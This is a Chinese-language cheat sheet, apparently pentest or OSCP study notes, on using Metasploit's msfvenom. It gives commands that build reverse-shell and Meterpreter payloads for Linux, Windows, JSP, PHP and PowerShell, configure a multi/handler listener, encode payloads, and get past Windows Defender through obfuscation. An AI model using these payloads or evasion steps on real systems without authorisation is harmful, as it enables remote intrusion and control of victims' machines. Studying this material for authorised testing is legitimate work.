---
cmd_type: Payload
service: Metasploit
os: General
tags:
  - cmd
syntax: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf
risk: Low
---

# msfvenom 使用指南

## 用途 / 适用场景

Metasploit 的 payload 生成器。拿到 RCE / 文件上传 / 命令执行点后，用一条命令生成目标平台（Linux/Windows/Java/PHP）的反弹载荷，配合 msfconsole 的 handler 接回 shell。也是 OSCP 里最常见的"生成 + 监听"组合。

## 基础语法

```bash
msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o <file>
```

- `-p`：指定 payload
- `LHOST` / `LPORT`：回连地址 / 端口
- `-f`：输出格式
- `-o`：输出文件名

## 关键命令：常用 payload

### Linux

```bash
# 无 stage 的裸 shell（最稳，接回来直接用）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o shell.elf

# 无 stage 的 meterpreter（单文件，无二次拉取）
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o meter.elf
```

### Windows

```bash
# staged：体积小，连接后 handler 再传第二段（payload 名带斜杠）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o staged.exe

# stageless：单文件全包，不二次拉取（payload 名带下划线）
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o stageless.exe

# 裸 cmd shell
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o shell.exe
```

### Java / PHP

```bash
# JSP webshell（部署到 Tomcat 等）
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war

# PHP
msfvenom -p php/php_reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
```

### PowerShell 一句话

```bash
msfvenom -p cmd/windows/powershell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f ps1
```

## 参数说明：输出格式 -f

| 格式 | 用途 |
| --- | --- |
| exe | Windows 可执行 |
| elf | Linux 可执行 |
| asp / aspx | IIS 脚本 |
| war | Java 打包（Tomcat 部署） |
| ps1 | PowerShell 脚本 |
| jsp | Java 脚本 |
| python | Python 脚本 |
| raw | 裸字节（嵌到别的 shell 里） |
| c | C 语言 shellcode 数组（写加载器用） |

## 编码 -e 与坏字符 -b

```bash
# x64 用 shikata_ga_nai 编码 5 次
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -e x64/shikata_ga_nai -i 5 -f exe -o encoded.exe

# 排除坏字符（多字节空格分隔）
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b "\x00\x0a\x0d" -f exe -o no_bad.exe

# 查看某 payload 支持哪些编码器
msfvenom --list encoders
```

## 监听（handler）

```bash
msfconsole -q
```

```text
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
exploit -j
```

> staged payload 的 handler 用 `windows/x64/meterpreter/reverse_tcp`（带斜杠）；stageless 用 `windows/x64/meterpreter_reverse_tcp`（带下划线）。必须和生成时一致。

## 实战流程

1. 确定目标平台（Linux / Windows / Java / PHP）。
2. 选 payload，`msfvenom` 生成文件。
3. `msfconsole` 起 `multi/handler` 监听。
4. 上传并执行目标文件（webshell 访问 / 上传后运行）。
5. 接回会话后 TTY 升级（Linux）或进 meterpreter（Windows）。
6. 需要时转 meterpreter 或做后渗透。

## 常见坑

1. staged 与 stageless 名字只差一个 `_`，handler 的 PAYLOAD 配错会接不回来。
2. 目标 Linux 若只装了 dash，接回的 shell 交互差，记得 TTY 升级。
3. Windows Defender 常杀裸 exe——优先走 `cmd/windows/powershell_reverse_tcp` 或自己做混淆。
4. `-e x64/shikata_ga_nai` 只对 x64 payload 有效，x86 用 `x86/shikata_ga_nai`。
5. 有坏字符（如 `\x00`）时忘了 `-b` 会导致 shellcode 执行失败。

## 参考开源项目

- Metasploit — https://github.com/rapid7/metasploit-framework
